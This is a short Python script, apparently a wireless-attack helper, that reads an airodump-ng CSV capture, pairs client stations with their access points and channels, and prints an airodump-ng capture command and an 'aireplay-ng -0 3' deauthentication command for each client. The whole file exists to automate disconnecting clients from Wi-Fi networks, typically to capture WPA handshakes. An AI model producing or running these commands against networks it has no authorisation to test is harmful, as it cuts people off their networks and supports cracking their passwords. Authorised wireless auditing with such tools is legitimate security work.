import csv

file = 'DUMP-01.csv'
interface = 'wlp2s0mon'
endLine = 1000
apMacAndChannel = {}
stationMacAndAP = {}

with open(file) as csvFile:
	reader = csv.reader(csvFile,skipinitialspace=True)
	for r in reader:

		# AP MAC and channel pairs
		if reader.line_num > 2 and reader.line_num < endLine:
			if not str(r) == "['', '', '', '', '', '', '', '', '', '', '', '', '', '', '']" and not str(r) == "[]":
				apMacAndChannel[r[0]] = r[3]
			else:
				endLine = reader.line_num
		
		# Station MAC and AP pairs
		elif reader.line_num > endLine + 1 and not str(r) == "[]" and not r[5] == "(not associated) ":
			stationMacAndAP[r[0]] = r[5]


for i in stationMacAndAP:
	channel = apMacAndChannel[stationMacAndAP[i]]
	apmac = stationMacAndAP[i]
	print("airodump-ng " + interface + " -a --berlin 60 -c " + channel + " --bssid " + apmac)
	print("aireplay-ng -0 3 -a " + apmac + " -c " + i)